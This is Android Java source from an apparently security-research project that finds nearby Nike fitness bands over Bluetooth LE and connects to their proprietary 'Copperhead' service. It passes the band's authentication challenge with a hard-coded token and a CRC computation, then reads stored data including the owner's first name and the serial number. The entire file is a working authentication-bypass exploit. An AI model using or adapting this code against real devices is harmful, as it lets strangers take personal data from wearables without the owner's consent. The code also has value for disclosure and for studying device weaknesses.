/*
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 * http://www.evilsocket.net/
 * 
 * This is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this software. If not, see <http://www.gnu.org/licenses/>.
 */
package com.evilsocket.blehacks;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

import com.evilsocket.blehacks.Utils.Logger;

import android.support.v7.app.ActionBarActivity;
import android.widget.TextView;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.ParcelUuid;


public class MainActivity extends ActionBarActivity 
{
	private final static int REQUEST_ENABLE_BT = 1;

	private final static UUID CLIENT_CHARACTERISTIC_CONFIG_UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb");
	
	private static final UUID COPPERHEAD_CMD_UUID = UUID.fromString("c7d25540-31dd-11e2-81c1-0800200c9a66");
	private static final UUID COPPERHEAD_RSP_UUID = UUID.fromString("d36f33f0-31dd-11e2-81c1-0800200c9a66");
	private static final UUID COPPERHEAD_SERVICE_UUID = UUID.fromString("83cdc410-31dd-11e2-81c1-0800200c9a66");

	private BluetoothManager _btManager = null;
	private BluetoothAdapter _btAdapter = null;
	private BLEIoQueue 		 _ioqueue   = null;

	private boolean _scanning = false;
	private BluetoothAdapter.LeScanCallback _leScanCallback = null;

	private static final byte[] NIKE_COMPANY_CODE = { 0, 120 };
	
	private void dumpDeviceAdvData( Bundle advData ) {
		Set<String> props = advData.keySet();

		for( String prop : props )
		{
			String mess = "  " + prop + " : ";
			
			if( prop.equals("COMPANYCODE") || prop.equals("MANUDATA") )
			{
				byte[] value = advData.getByteArray(prop);
				mess += Utils.bytesToHex(value) + " ( " + new String(value) + " )";
			}
			else if( prop.equals("SERVICES") )
			{
				ArrayList<ParcelUuid> services = advData.getParcelableArrayList(prop);
				for( ParcelUuid uuid : services )
				{
					mess += uuid.toString() + " ";
				}
			}
			else if( prop.equals("LOCALNAME") )
			{
				mess += advData.getString(prop);
			}
			
			Logger.d( mess );
		}
	}

	private static final Map<Integer, String> propsMap;
	static
	{
		propsMap = new HashMap<Integer, String>();
		
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_BROADCAST, "PROPERTY_BROADCAST" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_READ, "PROPERTY_READ" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE, "PROPERTY_WRITE_NO_RESPONSE" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_WRITE, "PROPERTY_WRITE" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_NOTIFY, "PROPERTY_NOTIFY" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_INDICATE, "PROPERTY_INDICATE" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_SIGNED_WRITE, "PROPERTY_SIGNED_WRITE" );
		propsMap.put( BluetoothGattCharacteristic.PROPERTY_EXTENDED_PROPS, "PROPERTY_EXTENDED_PROPS" );
	}
	
	private void dumpServices( BluetoothGatt gatt )
	{
		for( BluetoothGattService svc : gatt.getServices() )
    	{
    		String svc_uuid = svc.getUuid().toString(),
    			   svc_name = GATTAttributes.lookup( svc_uuid, "" );
    		Logger.d( "SERVICE " + svc_name + " ( " + svc_uuid + " )" );
    		
    		for( BluetoothGattCharacteristic chara : svc.getCharacteristics() )
    		{
    			String chr_uuid = chara.getUuid().toString(),
    				   chr_name = GATTAttributes.lookup( chr_uuid, "" );
    			int chr_props = chara.getProperties();
    			String props = "";
    			
    			Iterator it = propsMap.entrySet().iterator();
    			while( it.hasNext() ){
    				Map.Entry pairs = (Map.Entry)it.next();
    				
    				if( ( chr_props & (Integer)pairs.getKey() ) != 0 ){
    					props += pairs.getValue().toString() + " ";
    				}
    			}
    			
        		Logger.d( "    " + chr_name + " ( " + chr_uuid + " ) [" + props + "] : " + Utils.bytesToHex(chara.getValue() ) );
        		
        		for( BluetoothGattDescriptor desc : chara.getDescriptors() )
        		{
        			Logger.d( "      DESC: " + desc.getUuid() );
        		}
    		}
    	}
		
		Logger.d( "---------------------------------------------------------------------------" );
	}

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Logger.setLogView( this, (TextView)findViewById( R.id.log_view ) );

        _btManager = (BluetoothManager)getSystemService(Context.BLUETOOTH_SERVICE);
        _btAdapter = _btManager.getAdapter();
        
        if( _btAdapter.isEnabled() == false ){
        	Logger.w( "Bluetooth is disabled." );
        	
        	Intent enableIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);   
            startActivityForResult(enableIntent,REQUEST_ENABLE_BT);
        }
                      
        _leScanCallback = new BluetoothAdapter.LeScanCallback() {
        	
			@Override
			public void onLeScan(BluetoothDevice device, int rssi, byte[] scanRecord) {
				if( _scanning == false )
					return;
				
				try
				{
					/*
					 * Parse device advertisment data.
					 */
					final Bundle advData = AdvertisementData.parse(scanRecord);
					/*
					 * Is this a nike device?
					 */
					if( Arrays.equals(advData.getByteArray("COMPANYCODE"), NIKE_COMPANY_CODE ) )
					{
						Logger.i( "FOUND NIKE DEVICE [" + device +"]" );
						
						dumpDeviceAdvData( advData );
						
						_scanning = false;
						_btAdapter.stopLeScan(_leScanCallback);
						
						Logger.i( "Connecting to GATT server ..." );
						
						_ioqueue = new BLEIoQueue( new BLEIoQueue.QueueCallbacks() {	
							private BluetoothGattService	    _CopperheadService = null;
							private BluetoothGattCharacteristic _CommandChannel = null;
							private BluetoothGattCharacteristic _ResponseChannel = null;

							// add a raw packet to the queue
				        	private void addPacket( BLEIoQueue queue, byte[] data, BLEIoOperation.OnResponseCallback callback ){
				        		BLEIoOperation op = new BLEIoOperation( BLEIoOperation.Type.WRITE_CHARACTERISTICS, "Sending command.", callback );

				        		op.set_data( data );
				        		op.set_characteristic( _CommandChannel );
				        						        						        		
				        		queue.add(op);			        						        	
				        	}
				        	
				        	private void addPacket( BLEIoQueue queue, String s, BLEIoOperation.OnResponseCallback callback ){
				        		byte[] buffer = new byte[ s.length() / 2 ];
				        		
				        		for( int i = 0, j = 0; i < s.length(); i += 2, ++j ){
				        			buffer[j] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
				                             			+ Character.digit(s.charAt(i+1), 16));
				        		}
				        		
				        		addPacket( queue, buffer, callback );
				        	}
			
				        	// create the needed packet to request a specific setting from the device
				        	private void requestSetting( BLEIoQueue queue, int code )
				        	{
				        		CopperheadPacket oppacket = new CopperheadPacket(5);
				        		oppacket.setOpcode((byte)10);
				        		ByteBuffer b = oppacket.getPayloadBuffer();
				        		b.put( (byte)1 );
				        		b.put( (byte)code );
				        		
				        		Packet p = Packet.wrap(oppacket);
				        		
				        		p.setProtocolLayer( CommandResponseOperation.ProtocolLayer.COMMAND );
				        		p.setPacketCount(0);
				        		p.setPacketIndex(0);
				        		p.setSequenceNumber(1);
				        		
				        		addPacket( queue, p.getBuffer(), new BLEIoOperation.OnResponseCallback() {																	
				        			@Override
				        			public void onData(Packet config) {
				        				byte[] raw = config.getBuffer();
	
				        				try
				        				{
				        					Utils.processGetSettingsResponse(raw);
				        				}
				        				catch( Exception e )
				        				{
				        					Logger.e( e.toString() );
				        				}
				        			}
				        		} );
				        	}
				        	
							@Override
							public void onServicesDiscovered(BLEIoQueue queue, BluetoothGatt gatt, int status) {								
								dumpServices(gatt);
								
								_CopperheadService = gatt.getService( COPPERHEAD_SERVICE_UUID );
						    	if( _CopperheadService == null ){
						    		Logger.e( "No Copperhead service found." );
						    		return;
						    	}
						    	
						    	/*
						    	 * Get command and response channels.
						    	 */
						    	_CommandChannel = _CopperheadService.getCharacteristic( COPPERHEAD_CMD_UUID );						    	
						    	_ResponseChannel = _CopperheadService.getCharacteristic( COPPERHEAD_RSP_UUID );
						    	
						    	if( _CommandChannel == null ){
						    		Logger.e( "Could not find COPPERHEAD_CMD_UUID" );
						    		return;
						    	}
						    	else if( _ResponseChannel == null ){
						    		Logger.e( "Could not find COPPERHEAD_RSP_UUID" );
						    		return;
						    	}
						    	
						    	/*
						    	 * Enable the response channel to receive incoming data notifications.
						    	 */
						    	BluetoothGattDescriptor rsp_config_desc = _ResponseChannel.getDescriptor( CLIENT_CHARACTERISTIC_CONFIG_UUID );
						    	if( rsp_config_desc == null ){
						    		Logger.e( "RSP has no client config." );
						    		return;
						    	}

						    	BLEIoOperation notify = new BLEIoOperation( BLEIoOperation.Type.NOTIFY_START, "Enable response channel notifications." );
						    	
						    	notify.set_characteristic( _ResponseChannel );
						    	notify.set_descriptor( rsp_config_desc );
						    		
						    	queue.add(notify);
						    	
						    	final BLEIoQueue fq = queue;

						    	Packet auth = new Packet(19);
						    	
						    	/*
						    	 * Send the "START AUTH" packet -> 0x90 0x01 0x01 0x00 .....
						    	 */
						    	auth.setProtocolLayer( CommandResponseOperation.ProtocolLayer.SESSION );
						    	auth.setPacketCount(0);
						    	auth.setPacketIndex(0);
						    	auth.setSequenceNumber(1);
						    	auth.setCommandBytes( (byte)1, (byte)1 );
						    	
						    	addPacket( queue, auth.getBuffer(), new BLEIoOperation.OnResponseCallback() {									
									@Override
									public void onData( Packet challenge_packet ) {										
										
										Logger.d( "<< " + challenge_packet.toString() );

										ByteBuffer buffer = challenge_packet.getBuffered(ByteOrder.LITTLE_ENDIAN);
										
										// remove op code and length
										int opcode = buffer.get();
										int length = buffer.get();
																				
										switch( buffer.get() )
										{
											case 0x41:
												Logger.i( "Received authentication challenge" );
																	
												/*
												 * Get 16 bytes of AUTH nonce
												 */
												byte[] nonce = new byte[16];
												buffer.get(nonce);

												if ((nonce == null) || (nonce.length != 16))
												{
													Logger.e("Missing or invalid authentication challenge nonce");
												}
												else
												{
												    CopperheadCRC32 crc = new CopperheadCRC32();
												    
												    byte[] auth_token = Utils.hexToBytes("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"); 
										    												    
													Logger.d( "NONCE: " + Utils.bytesToHex( nonce ) );
													
													/*
													 * Create the response packet: 0xb0 0x03 0x02 [2 BYTES OF CRC] 0x00 ...
													 */
													Packet resp_packet = new Packet(19);
													
													resp_packet.setProtocolLayer( CommandResponseOperation.ProtocolLayer.SESSION );
													resp_packet.setPacketCount(0);
													resp_packet.setPacketIndex(0);
													resp_packet.setSequenceNumber( challenge_packet.getSequenceNumber() + 1 );
													
													ByteBuffer response = ByteBuffer.allocate(18);
													
													response.put( (byte)0x03 );
													response.put( (byte)0x02 );
													
													crc.update(nonce);
												    crc.update(auth_token);
												    
												    short sum = (short)((0xFFFF & crc.getValue()) ^ (0xFFFF & crc.getValue() >>> 16));
												    												    
												    response.putShort(sum);
												    
												    resp_packet.setPayload( response.array() );

													addPacket( fq, resp_packet.getBuffer(), new BLEIoOperation.OnResponseCallback() {														
														@Override
														public void onData(Packet challenge_response) {
															
															Logger.d( "<< " + challenge_response.toString() );
															
															ByteBuffer buffer = challenge_response.getBuffered(ByteOrder.LITTLE_ENDIAN);
															
															// remove op code and length
															int opcode = buffer.get();
															int length = buffer.get();
															
															/*
															 * Get the authentication reply code.
															 */
															int reply = buffer.get();
															
															if( reply == 0x42 ) {
																Logger.i( "Succesfully authenticated." );
																	
																// Request some settings
																requestSetting( fq, Utils.getSettingCode( "BAND_COLOR" ) );
																requestSetting( fq, Utils.getSettingCode( "FUEL" ) );
																requestSetting( fq, Utils.getSettingCode( "FIRST_NAME" ) );
																requestSetting( fq, Utils.getSettingCode( "SERIAL_NUMBER" ) );
															}
															else {
																Logger.e( "Authentication failure, reply: " + reply );
															}
														}
													});
												}
												
											break;
											
											default:
												
												Logger.e( "Unknown auth code." );
										}
									}
								});	
							}
						});
										
						device.connectGatt( MainActivity.this, false, _ioqueue );
					}
				}
				catch( Exception e )
				{
					Logger.e( e.toString() );
				}
			}
        };
        
        Logger.i( "Starting scann ..." );
        
        _scanning = true;
        _btAdapter.startLeScan(_leScanCallback);
    }

}
